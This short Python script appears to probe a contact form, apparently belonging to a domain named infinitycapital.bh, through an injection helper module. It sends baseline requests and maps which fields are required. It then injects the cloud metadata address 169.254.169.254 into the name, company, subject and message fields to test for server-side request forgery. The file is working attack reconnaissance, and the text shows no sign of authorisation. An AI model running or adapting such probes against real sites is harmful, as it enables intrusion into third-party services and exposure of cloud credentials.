import sys, time
sys.path.insert(0,'AT')
from p1_inj import send, base_fields, AT

# valid to, then vary ONE other field with injection payloads
def ok_fields(**kw):
    f = base_fields()
    f["targets"] = "info"+AT+"infinitycapital.bh"
    f.update(kw)
    return f

print("== VALID to baseline ==")
for i in range(3):
    st,body,dt = send(ok_fields())
    print(st, round(dt,2), body[:200], flush=True); time.sleep(1.0)

print("== missing-field matrix (which fields are required?) ==")
for miss in ["fname","lname","areacode","tel","cname","subject","msg","check","targets"]:
    f = ok_fields(); f.pop(miss, None)
    st,body,dt = send(f)
    print(f"no-{miss:9s} -> {st} {body[:170]}", flush=True); time.sleep(1.0)

print("== SSRF / URL sinks: does any field get fetched server-side? ==")
for fld in ["fname","cname","subject","msg"]:
    f = ok_fields(**{fld: "http://169.254.169.254/latest/meta-data/"})
    st,body,dt = send(f)
    print(f"{fld:8s} url -> {st} {dt:.2f}s {body[:130]}", flush=True); time.sleep(1.0)
